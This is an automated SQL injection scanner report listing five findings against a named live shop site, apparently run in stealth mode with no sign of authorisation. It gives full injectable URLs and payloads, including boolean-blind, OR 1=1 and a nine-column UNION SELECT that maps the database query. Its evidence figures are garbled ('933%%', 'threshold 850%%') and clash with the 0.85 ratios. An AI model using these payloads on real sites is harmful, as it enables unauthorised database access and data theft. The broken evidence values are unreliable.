# Toran_MAP — SQL Injection Assessment Report

## Metadata

| Field | Value |
|---|---|
| Tool | Toran_MAP 2.0.0-enterprise |
| Target | `https://3rabs-store.gt.tc/?i=1` |
| Started | 2026-06-27T14:48:37+03:00 |
| Finished | 2026-06-27T14:49:26+03:00 |
| Duration | 49.317s |
| Stealth Mode | true |

## Summary

| Severity | Count |
|---|---|
| 🟣 Critical | 1 |
| 🔴 High     | 1 |
| 🟡 Medium   | 3 |
| 🟢 Low      | 0 |
| **Total**  | **5** |

## Findings

### Finding #01 — Stacked Query (structural response change)

| Field | Value |
|---|---|
| Severity  | **Medium** |
| Method    | `GET` |
| Parameter | `i` |
| URL       | `https://3rabs-store.gt.tc/?i=%27%3B+SELECT+1--` |
| Payload   | `'; SELECT 1--` |
| Evidence  | Similarity ratio 0.00 < threshold 0.85 |

### Finding #02 — Boolean-Based Blind SQLi (Ratio-Differential)

| Field | Value |
|---|---|
| Severity  | **High** |
| Method    | `GET` |
| Parameter | `i` |
| URL       | `https://3rabs-store.gt.tc/?i=1%2F%2A%2A%2FAND%2F%2A%2A%2F1%3D1` |
| Payload   | `1/**/AND/**/1=1` |
| Evidence  | Ratio-based differential confirmed SQLi:   TRUE  payload similarity to baseline : 933%%   FALSE payload similarity to baseline : 00%%   Structural divergence detected (threshold 850%%) |

### Finding #03 — Comment Termination (structural change)

| Field | Value |
|---|---|
| Severity  | **Medium** |
| Method    | `GET` |
| Parameter | `i` |
| URL       | `https://3rabs-store.gt.tc/?i=1--%250A` |
| Payload   | `1--%0A` |
| Evidence  | Similarity ratio 0.00 < threshold 0.85 |

### Finding #04 — Numeric Context (data-leak hint)

| Field | Value |
|---|---|
| Severity  | **Medium** |
| Method    | `GET` |
| Parameter | `i` |
| URL       | `https://3rabs-store.gt.tc/?i=-1%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1` |
| Payload   | `-1/**/OR/**/1=1` |
| Evidence  | Similarity ratio 0.00 — structural divergence detected |

### Finding #05 — UNION-Based SQLi

| Field | Value |
|---|---|
| Severity  | **Critical** |
| Method    | `GET` |
| Parameter | `i` |
| URL       | `https://3rabs-store.gt.tc/?i=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--` |
| Payload   | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--` |
| Evidence  | UNION with 9 NULLs succeeded; ORDER BY 10 fails |

